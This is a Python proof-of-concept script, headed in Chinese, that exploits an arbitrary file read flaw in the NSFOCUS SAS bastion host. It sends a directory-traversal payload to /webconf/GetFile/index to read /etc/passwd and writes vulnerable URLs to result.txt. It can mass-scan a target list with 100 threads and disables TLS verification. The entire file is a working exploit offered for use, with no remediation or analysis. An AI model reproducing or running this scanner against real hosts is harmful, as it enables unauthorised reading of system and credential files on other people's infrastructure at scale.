# 绿盟 SAS堡垒机 GetFile 任意文件读取漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
██╗     ███╗   ███╗      ███████╗ █████╗ ███████╗       ██████╗ ███████╗████████╗███████╗██╗██╗     ███████╗
██║     ████╗ ████║      ██╔════╝██╔══██╗██╔════╝      ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██║██║     ██╔════╝
██║     ██╔████╔██║█████╗███████╗███████║███████╗█████╗██║  ███╗█████╗     ██║   █████╗  ██║██║     █████╗  
██║     ██║╚██╔╝██║╚════╝╚════██║██╔══██║╚════██║╚════╝██║   ██║██╔══╝     ██║   ██╔══╝  ██║██║     ██╔══╝  
███████╗██║ ╚═╝ ██║      ███████║██║  ██║███████║      ╚██████╔╝███████╗   ██║   ██║     ██║███████╗███████╗
╚══════╝╚═╝     ╚═╝      ╚══════╝╚═╝  ╚═╝╚══════╝       ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝╚══════╝╚══════╝
                                                                          author:daesen804
                                                                          version:1.0.0                                  
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟 SAS堡垒机 GetFile 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    
    try:
        res = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=10)
        if res.status_code == 200 and 'nos:x:0:0::/:' in res.text:
            with open("result.txt",'a') as fp:
                fp.write(target+'\n')
            print(f"[+]{target} 存在任意文件读取漏洞")
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        pass
        

if __name__ == '__main__':
    main()